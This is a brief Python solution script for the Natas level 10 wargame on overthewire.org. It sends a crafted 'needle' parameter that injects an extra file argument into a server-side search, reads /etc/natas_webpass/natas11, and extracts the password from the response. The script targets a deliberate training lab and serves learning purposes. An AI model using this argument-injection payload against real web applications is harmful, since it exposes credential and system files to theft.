import requests
import re
from requests.auth import HTTPBasicAuth
def solve10(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    resp = session.get("http://natas10.natas.labs.overthewire.org/?needle=%22%22+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
